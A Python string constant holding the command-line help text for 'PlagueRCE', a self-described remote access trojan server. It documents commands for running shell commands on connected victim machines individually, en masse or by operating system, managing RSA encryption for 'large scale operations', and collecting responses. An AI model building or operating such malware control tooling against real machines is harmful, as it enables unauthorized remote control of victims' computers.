# CLI help message
help_message: str = '''
Welcome to PlagueRCE, the ultimate RAT server

- Upon entering a command, if the command is a CLI command, it will be executed by the server
and not executed by the currently connected client.
- If the command is not a CLI command it will be executed by the currently connected client.
Ensure each CLI command entered is spelled correctly to prevent unwanted results.
- If the client who is the currently connected client disconnects, and reconnects again without the user
changing the currently connected client, the client will reconnect as the currently connected client

Encryption mode: 
Each generated key pair is a 2048 bit RSA key pair.
Server loads up in unencryption mode by default, but can be switched to encryption mode via 
encryption_mode command. When a client connects to the server, it treats the current key pair
on the server in encryption mode as the clients permanent key pair, so make sure you are
using encryption mode properly otherwise it can cause problems with server/client communication.
For this reason, I suggest you to stay on encryption mode the entire time and not generate a new key pair
when you are working on large scale operations, as it will have a high chance of causing problems.
When you generate a key pair, configure the key pair with your payload and then have the client
execute the payload for encrypted communication.
If you are too stupid and not skilled enough to use encryption mode properly and effectively, 
then don't use it at all as you will only just cause problems with your own operation.

/ escapes send options and CLI commands (e.g. /$command will have client execute $command)

Send command options
By default, commands are executed on the first payload on the currently connected client
$command: $ before a command to execute command on all payloads on currently connected client 
!command: ! before a command to execute command on first payload across all clients 
?!command: ?! before a command to execute command to execute command on all payloads across all clients 
&!command: &! before a command to execute the command on all payloads across all clients using a particular OS
&command: & before a command to execute the command on first payload on all clients using a particular OS

User help 
help: Show this message
quit: Exit the program

Encryption mode
current_keys: Display current server key pair if in encryption mode
encryption_mode: Enable encryption mode, and generate a new key pair
new_keys: Generate new server key pair (dangerous)
unencryption_mode: Disable encryption mode and delete existing key pair

Current connected client
current: Show client the user is currently connected to
current_client_OS: Display current connected client's operating system
current_latest: Show latest response from currently connected client
current_all: Show all responses from currently connected client
change: Change the current connected client

All connected clients
list: List all connected clients and their information
list_OS: Display all operating systems being used by clients
who_responded: Display list of all clients who have sent a response to server
responses_amount: Trigger temporary CLI to show specific amount of responses from a client
responses_latest: Trigger temporary CLI to show the latest response from a client
responses_all: Display all responses from all clients
responses_all_OS: Display all responses from all clients using a particular OS
'''.strip()